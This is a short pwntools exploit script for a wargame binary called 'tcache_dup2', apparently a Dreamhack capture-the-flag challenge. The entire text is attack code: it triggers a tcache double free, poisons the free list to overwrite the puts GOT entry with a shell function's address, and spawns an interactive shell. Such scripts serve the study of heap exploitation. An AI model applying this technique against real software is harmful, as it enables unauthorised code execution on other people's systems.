from pwn import *

def Create(size, data):
    p.sendlineafter('> ', '1')
    p.sendlineafter(': ', str(size))
    p.sendlineafter(': ', data) 
def Modify(idx, size, data):
    p.sendlineafter('> ', '2') 
    p.sendlineafter(': ', str(idx))
    p.sendlineafter(': ', str(size))
    p.sendlineafter(': ', data)
def Delete(idx):
    p.sendlineafter('> ', '3') 
    p.sendlineafter(': ', str(idx)) 

p = process('tcache_dup2')
#p = remote('host1.dreamhack.games', 22164)
Create(10, 'aaaaa')
Delete(0)
Modify(0, 0x10, 'a'*0x10)
Delete(0)
addr_shell = 0x401530
elf = ELF('tcache_dup2')
addr_got_puts = elf.got['puts']
addr_shell = 0x401530
Modify(0, 8, p64(addr_got_puts))
Create(10, p64(addr_got_puts))
Create(10, p64(addr_shell))
p.interactive()
